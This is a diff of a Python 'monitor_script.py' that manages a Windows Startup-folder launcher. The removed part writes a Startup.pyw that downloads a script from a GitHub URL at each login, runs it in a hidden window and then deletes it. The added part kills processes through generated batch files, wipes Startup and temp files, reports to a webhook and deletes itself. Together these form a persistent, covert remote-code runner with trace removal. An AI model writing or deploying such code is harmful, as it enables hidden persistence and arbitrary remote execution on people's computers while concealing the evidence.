@@ -1,4 +1,4 @@
-# monitor_script.py - Kills only old launcher, not current process
+# monitor_script.py - Kills old launcher and cleans up files only
 import os
 import sys
 import subprocess
@@ -16,41 +16,37 @@ def send_webhook(message):
     except:
         pass
 
-def kill_only_old_launcher():
-    """Kill only the old launcher process, not this one"""
-    startup_folder = os.path.join(
-        os.getenv('APPDATA'),
-        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-    )
+def kill_old_launcher():
+    """Kill the old launcher process"""
+    print("Killing old launcher processes...")
     
-    # Get current process ID to avoid killing ourselves
-    current_pid = os.getpid()
-    
-    # Create batch file that targets only the old launcher
-    batch_script = f'''@echo off
-:: Get the path to the old launcher
-set STARTUP_PATH="{startup_folder}\\Startup.pyw"
+    # Create batch file to kill old launcher processes
+    batch_script = '''@echo off
+:: Kill Python processes running old launchers
+taskkill /f /fi "windowtitle eq GitHub Auto-Deploy Launcher*" 2>nul
+taskkill /f /fi "windowtitle eq Press Enter to close*" 2>nul
 
-:: Find processes running the old launcher (but not current monitor script)
-wmic process where "commandline like '%%Startup.pyw%%' and not commandline like '%%monitor_script.py%%'" get processid 2>nul | findstr /r "[0-9]" > "%TEMP%\\old_pids.txt"
-
-:: Kill each old launcher process
+:: Kill processes with old launcher names in command line
+wmic process where "commandline like '%%Startup.pyw%%'" get processid 2>nul | findstr /r "[0-9]" > "%TEMP%\\old_pids.txt"
 for /f "tokens=*" %%i in (%TEMP%\\old_pids.txt) do (
     taskkill /f /pid %%i 2>nul
 )
 
-:: Also kill by window title (old launcher console)
-taskkill /fi "windowtitle eq GitHub Auto-Deploy Launcher*" /f 2>nul
-taskkill /fi "windowtitle eq Press Enter to close*" /f 2>nul
+:: Kill any remaining pythonw.exe processes that might be old launchers
+:: (Be careful not to kill this monitor script)
+wmic process where "name='pythonw.exe'" get processid, commandline 2>nul | findstr /i "startup\|launcher" | findstr /r "[0-9]" > "%TEMP%\\python_pids.txt"
+for /f "tokens=1" %%i in (%TEMP%\\python_pids.txt) do (
+    taskkill /f /pid %%i 2>nul
+)
 
-:: Clean up
+:: Clean up temp files
 del "%TEMP%\\old_pids.txt" 2>nul
+del "%TEMP%\\python_pids.txt" 2>nul
 timeout /t 2 /nobreak >nul
-echo Old launcher killed
-del "%~f0" 2>nul
+echo Old launcher processes killed
 '''
     
-    batch_path = tempfile.gettempdir() + "/kill_old_only.bat"
+    batch_path = os.path.join(tempfile.gettempdir(), "kill_old_launcher.bat")
     with open(batch_path, 'w') as f:
         f.write(batch_script)
     
@@ -61,172 +57,132 @@ del "%~f0" 2>nul
     time.sleep(3)  # Wait for kill to complete
     return True
 
-def create_new_launcher():
-    """Create the new Startup.pyw"""
-    startup_folder = os.path.join(
-        os.getenv('APPDATA'),
-        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-    )
-    
-    # The new launcher code
-    launcher_code = '''import os
-import sys
-import subprocess
-import urllib.request
-import tempfile
-import time
-
-def run_script():
-    """Download and run script.py from GitHub"""
-    try:
-        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
-        script_code = urllib.request.urlopen(url, timeout=10).read().decode('utf-8')
-        
-        temp_dir = tempfile.gettempdir()
-        timestamp = str(int(time.time()))
-        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
-        
-        with open(temp_script, 'w', encoding='utf-8') as f:
-            f.write(script_code)
-        
-        # Run hidden
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        
-        subprocess.Popen(
-            [sys.executable, temp_script],
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        
-        # Delete temp file after 10 seconds
-        time.sleep(10)
-        try:
-            os.remove(temp_script)
-        except:
-            pass
-        
-        return True
-        
-    except Exception as e:
-        return False
-
-def main():
-    """Main launcher function"""
-    # Wait for network
-    time.sleep(5)
-    
-    # Run the script
-    run_script()
-    
-    # Keep alive
-    while True:
-        time.sleep(3600)
-
-if __name__ == "__main__":
-    main()
-'''
-    
-    # Write the launcher
-    launcher_path = os.path.join(startup_folder, "Startup.pyw")
-    with open(launcher_path, 'w', encoding='utf-8') as f:
-        f.write(launcher_code)
-    
-    print(f"✓ Created new launcher: {launcher_path}")
-    return launcher_path
-
 def cleanup_files():
-    """Clean up old files"""
+    """Clean up old files from startup folder"""
     startup_folder = os.path.join(
         os.getenv('APPDATA'),
         'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
     )
     
-    print("Cleaning up files...")
+    print("Cleaning up files from startup folder...")
     
-    # Delete specific files
+    # List of files to delete (only old/obsolete ones)
     files_to_delete = [
         "startup_log.txt",
         "github_launcher.pyw",
         "update_cache.json",
         "requirements.txt",
-        "clean_launcher.pyw"
+        "clean_launcher.pyw",
+        "old_launcher_backup.pyw",
+        "launcher_update.py"
     ]
     
     deleted = []
+    failed = []
+    
     for filename in files_to_delete:
         filepath = os.path.join(startup_folder, filename)
         if os.path.exists(filepath):
             try:
+                # Try to delete the file
+                for attempt in range(3):
+                    try:
+                        os.remove(filepath)
+                        deleted.append(filename)
+                        print(f"  ✓ Deleted: {filename}")
+                        break
+                    except PermissionError:
+                        if attempt < 2:
+                            time.sleep(1)
+                        else:
+                            failed.append(filename)
+                    except Exception as e:
+                        failed.append(filename)
+            except:
+                failed.append(filename)
+    
+    # Also clean up any temporary monitor scripts
+    temp_dir = tempfile.gettempdir()
+    for file in os.listdir(temp_dir):
+        if file.startswith("monitor_") and file.endswith(".py"):
+            try:
+                filepath = os.path.join(temp_dir, file)
                 os.remove(filepath)
-                deleted.append(filename)
+                print(f"  ✓ Deleted temp file: {file}")
             except:
                 pass
     
+    # Summary
     if deleted:
-        print(f"Deleted: {', '.join(deleted)}")
+        print(f"\nSuccessfully deleted: {', '.join(deleted)}")
+    if failed:
+        print(f"Failed to delete: {', '.join(failed)}")
     
-    return True
+    return len(deleted) > 0
 
-def start_new_launcher(launcher_path):
-    """Start the new launcher"""
+def delete_self():
+    """Delete this monitor script after completion"""
     try:
-        # Create batch file to start launcher after current process exits
-        batch_script = f'''@echo off
-timeout /t 3 /nobreak >nul
-start /b "" pythonw "{launcher_path}"
-echo New launcher started
+        # Wait a moment to ensure everything is done
+        time.sleep(2)
+        
+        # Get current script path
+        script_path = os.path.abspath(__file__)
+        
+        # Only delete if in temp directory
+        if 'temp' in script_path.lower() or 'tmp' in script_path.lower():
+            # Create batch file to delete this script
+            batch_script = f'''@echo off
+timeout /t 2 /nobreak >nul
+del "{script_path}" 2>nul
+echo Monitor script cleaned up
 del "%~f0" 2>nul
 '''
-        
-        batch_path = tempfile.gettempdir() + "/start_new.bat"
-        with open(batch_path, 'w') as f:
-            f.write(batch_script)
-        
-        subprocess.Popen(['cmd', '/c', batch_path],
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        print("✓ New launcher will start in 3 seconds")
-        return True
-        
+            
+            batch_path = os.path.join(tempfile.gettempdir(), "delete_self.bat")
+            with open(batch_path, 'w') as f:
+                f.write(batch_script)
+            
+            subprocess.Popen(['cmd', '/c', batch_path],
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            print("Self-cleanup scheduled")
     except:
-        return False
+        pass
 
 def main():
-    """Main function"""
+    """Main cleanup function - only does cleanup, no launcher creation"""
     print("=" * 60)
-    print("LAUNCHER UPDATER - SELECTIVE KILL")
+    print("LAUNCHER CLEANUP TOOL")
     print("=" * 60)
     
-    # Step 1: Kill only old launcher
-    print("\n[1/4] Killing old launcher (not current process)...")
-    kill_only_old_launcher()
+    # Step 1: Kill old launcher processes
+    print("\n[1/2] Killing old launcher processes...")
+    kill_old_launcher()
+    print("✓ Old launcher processes terminated")
     
     # Step 2: Clean up files
-    print("\n[2/4] Cleaning up files...")
-    cleanup_files()
+    print("\n[2/2] Cleaning up old files...")
+    cleanup_success = cleanup_files()
     
-    # Step 3: Create new launcher
-    print("\n[3/4] Creating new launcher...")
-    launcher_path = create_new_launcher()
-    
-    # Step 4: Start new launcher
-    print("\n[4/4] Starting new launcher...")
-    start_new_launcher(launcher_path)
-    
-    # Send webhook
-    send_webhook("✅ Launcher updated! Old launcher killed, new launcher created.")
+    # Send webhook notification
+    if cleanup_success:
+        send_webhook("🧹 Launcher cleanup completed! Old processes killed and files removed.")
+        print("\n✓ Cleanup completed successfully")
+    else:
+        send_webhook("⚠️ Launcher cleanup attempted but some files may remain")
+        print("\n⚠️ Cleanup completed with some issues")
     
     print("\n" + "=" * 60)
-    print("UPDATE COMPLETE!")
-    print("✓ Old launcher killed")
-    print("✓ Files cleaned up")
-    print("✓ New launcher created")
-    print("✓ New launcher will start automatically")
+    print("CLEANUP COMPLETE")
     print("=" * 60)
     
-    # Wait and exit
+    # Schedule self-deletion if running from temp
+    delete_self()
+    
+    # Exit
     time.sleep(2)
+    sys.exit(0 if cleanup_success else 1)
 
 if __name__ == "__main__":
     main()
